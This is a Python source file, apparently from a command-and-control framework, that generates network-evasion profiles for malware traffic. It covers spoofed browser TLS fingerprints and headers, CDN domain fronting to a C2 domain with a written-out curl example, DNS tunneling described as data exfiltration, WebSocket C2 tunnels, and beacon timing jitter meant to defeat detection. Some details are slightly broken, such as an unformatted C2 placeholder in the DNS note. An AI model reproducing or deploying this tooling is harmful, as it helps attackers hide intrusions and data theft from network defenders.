"""
server_core/evasion/traffic_obfuscator.py

Network traffic obfuscation — TLS fingerprint randomization (JA3/JA4 spoofing),
HTTP header morphing, CDN domain fronting, DNS/ICMP/WebSocket tunneling,
and protocol impersonation to evade network-based detection.
"""

import json
import logging
import random
import re
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse

logger = logging.getLogger(__name__)


class TrafficObfuscator:
  """Network traffic camouflage and protocol obfuscation.

  Provides JA3/JA4 TLS fingerprint randomization, HTTP header morphing
  to impersonate legitimate browsers/CDNs, domain fronting through CDN
  providers, and protocol tunneling (DNS, ICMP, WebSocket).
  """

  # Real browser TLS fingerprints (JA3 hashes)
  JA3_BROWSERS = [
    "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0",  # Chrome 120
    "771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-34-51-43-27-17513-45-13-18,29-23-24,0",  # Firefox 121
    "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,10-11-35-16-5-13-18-51-45-43-27-17513-0-23-65281,29-23-24,0",  # Edge 120
    "772,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0",  # Safari 17
  ]

  # Legitimate browser User-Agent strings
  USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
  ]

  # CDN domains for fronting
  CDN_FRONT_DOMAINS = {
    "cloudflare": ["cloudflare.com", "cdn.cloudflare.net", "cloudflare-eth.com"],
    "azure": ["azureedge.net", "azurefd.net", "azure.com"],
    "fastly": ["fastly.net", "global.ssl.fastly.net", "fastlylb.net"],
    "aws": ["cloudfront.net", "amazonaws.com", "awsstatic.com"],
    "google": ["googleapis.com", "storage.googleapis.com", "googlehosted.com"],
  }

  # Common legitimate Host header values
  LEGIT_HOSTS = [
    "www.microsoft.com", "www.google.com", "www.cloudflare.com",
    "cdn.jsdelivr.net", "ajax.googleapis.com", "api.github.com",
    "www.bing.com", "update.googleapis.com", "ocsp.digicert.com",
    "ctldl.windowsupdate.com", "www.apple.com", "cdn.cloudflare.net",
  ]

  def __init__(self):
    pass

  # ── JA3/JA4 Fingerprint Randomization ────────────────────────────────

  def random_ja3(self) -> str:
    """Return a random JA3 hash from known legitimate browsers."""
    return random.choice(self.JA3_BROWSERS)

  def ja3_config(self, browser: str = "random") -> Dict[str, Any]:
    """Generate a TLS configuration that produces the target JA3 fingerprint.

    Args:
      browser: 'chrome', 'firefox', 'edge', 'safari', or 'random'.

    Returns:
      Dict with cipher suites, extensions, curves, and ALPN settings.
    """
    ja3 = self.random_ja3() if browser == "random" else self.JA3_BROWSERS[
      {"chrome": 0, "firefox": 1, "edge": 2, "safari": 3}.get(browser, 0)
    ]

    parts = ja3.split(",")
    tls_ver = parts[0]
    ciphers = parts[1].split("-") if len(parts) > 1 else []
    extensions = parts[2].split("-") if len(parts) > 2 else []
    curves = parts[3].split("-") if len(parts) > 3 else []

    return {
      "success": True,
      "tls_version": int(tls_ver),
      "ja3_hash": ja3,
      "ciphers": ciphers[:5] + ["..."],
      "extensions": extensions[:5] + ["..."],
      "elliptic_curves": curves,
      "alpn": ["h2", "http/1.1"],
      "config_note": "Use these settings in your TLS client to match the JA3 fingerprint",
    }

  # ── HTTP Header Morphing ─────────────────────────────────────────────

  def morph_headers(self, impersonate: str = "chrome") -> Dict[str, str]:
    """Generate HTTP headers that impersonate a legitimate browser.

    Args:
      impersonate: 'chrome', 'firefox', 'safari', 'edge', or 'random'.

    Returns:
      Dict of HTTP headers matching the target browser.
    """
    browser_profiles = {
      "chrome": {
        "User-Agent": self.USER_AGENTS[0],
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-Ch-Ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
      },
      "firefox": {
        "User-Agent": self.USER_AGENTS[2],
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "Connection": "keep-alive",
      },
      "safari": {
        "User-Agent": self.USER_AGENTS[4],
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
      },
    }

    profile = browser_profiles.get(impersonate)
    if not profile:
      profile = random.choice(list(browser_profiles.values()))

    # Add randomized but legitimate-looking headers
    profile["X-Requested-With"] = "XMLHttpRequest" if random.random() > 0.5 else ""
    profile = {k: v for k, v in profile.items() if v}  # Remove empty values

    return profile

  # ── Domain Fronting ──────────────────────────────────────────────────

  def domain_front_config(
    self,
    c2_domain: str,
    cdn: str = "cloudflare",
  ) -> Dict[str, Any]:
    """Generate a domain fronting configuration through a CDN.

    The TLS SNI goes to the CDN's legitimate domain while the HTTP Host
    header points to the C2 domain. CDN routes traffic based on Host header.

    Args:
      c2_domain: Your C2 domain proxied through the CDN.
      cdn: CDN provider to front through (cloudflare, azure, fastly, aws).

    Returns:
      Dict with front domain, TLS SNI, Host header, and connection config.
    """
    fronts = self.CDN_FRONT_DOMAINS.get(cdn, self.CDN_FRONT_DOMAINS["cloudflare"])
    front_domain = random.choice(fronts)

    return {
      "success": True,
      "cdn_provider": cdn,
      "front_domain": front_domain,
      "tls_sni": front_domain,
      "host_header": c2_domain,
      "connect_to": f"{front_domain}:443",
      "method": "domain_fronting",
      "note": f"TLS handshake with {front_domain}, HTTP Host: {c2_domain}. "
              f"CDN ({cdn}) routes to origin: {c2_domain}",
      "curl_example": (
        f"curl -s --resolve '{front_domain}:443:<CDN_EDGE_IP>' "
        f"-H 'Host: {c2_domain}' https://{front_domain}/"
      ),
    }

  # ── Protocol Tunneling ───────────────────────────────────────────────

  def dns_tunnel_config(
    self,
    c2_domain: str,
    record_type: str = "TXT",
  ) -> Dict[str, Any]:
    """Generate DNS tunneling configuration."""
    return {
      "success": True,
      "method": "dns_tunnel",
      "c2_domain": c2_domain,
      "record_type": record_type,
      "max_payload_size": 255 if record_type == "TXT" else 512,
      "encoding": "base64",
      "chunking": "subdomain labels (63 chars max per label)",
      "note": "Data exfiltrated via DNS queries to {c2_domain}. "
              "Each query encodes a chunk of data as a subdomain.",
      "example_query": f"<base64_chunk>.{c2_domain}",
    }

  def websocket_tunnel_config(
    self,
    c2_url: str,
    mask_traffic: bool = True,
  ) -> Dict[str, Any]:
    """Generate WebSocket-based C2 tunnel configuration."""
    return {
      "success": True,
      "method": "websocket_tunnel",
      "c2_url": c2_url,
      "protocol": "wss" if c2_url.startswith("https") else "ws",
      "masking": mask_traffic,
      "keepalive_interval": random.randint(30, 120),
      "headers": self.morph_headers("chrome"),
      "note": "WebSocket traffic looks like normal browser websocket connections. "
              "Use wss:// (TLS) for encryption. Mask frames to avoid detection.",
    }

  # ── Traffic Pattern Randomization ────────────────────────────────────

  def randomize_timing(
    self,
    base_interval: float = 5.0,
    jitter: float = 2.0,
  ) -> Dict[str, Any]:
    """Generate randomized beacon timing to avoid pattern detection."""
    return {
      "success": True,
      "base_interval": base_interval,
      "jitter": jitter,
      "jitter_percent": round((jitter / base_interval) * 100, 1),
      "actual_interval": round(base_interval + random.uniform(-jitter, jitter), 2),
      "technique": "randomized_jitter",
      "note": "Use randomized intervals to avoid beacon detection via timing analysis. "
              "Legitimate traffic has natural jitter; C2 beacons are often perfectly periodic.",
    }

  def randomize_packet_size(
    self,
    target_size: int = 512,
    variance: int = 200,
  ) -> Dict[str, Any]:
    """Randomize packet/chunk sizes to avoid size-based detection."""
    sizes = [
      max(64, target_size + random.randint(-variance, variance))
      for _ in range(5)
    ]
    return {
      "success": True,
      "target_size": target_size,
      "variance": variance,
      "sample_sizes": sizes,
      "technique": "randomized_packet_size",
    }

  # ── Full Obfuscation Profile ─────────────────────────────────────────

  def full_profile(
    self,
    c2_domain: str = "",
    cdn: str = "cloudflare",
  ) -> Dict[str, Any]:
    """Generate a complete traffic obfuscation profile."""
    browser = random.choice(["chrome", "firefox", "safari"])
    headers = self.morph_headers(browser)
    ja3 = self.ja3_config(browser)
    timing = self.randomize_timing()
    sizing = self.randomize_packet_size()

    profile = {
      "success": True,
      "profile_name": f"stealth_{browser}_{random.randint(1000,9999)}",
      "tls": ja3,
      "http_headers": headers,
      "beacon_timing": timing,
      "packet_sizing": sizing,
    }

    if c2_domain:
      profile["domain_fronting"] = self.domain_front_config(c2_domain, cdn)
      profile["dns_tunnel"] = self.dns_tunnel_config(c2_domain)

    return profile
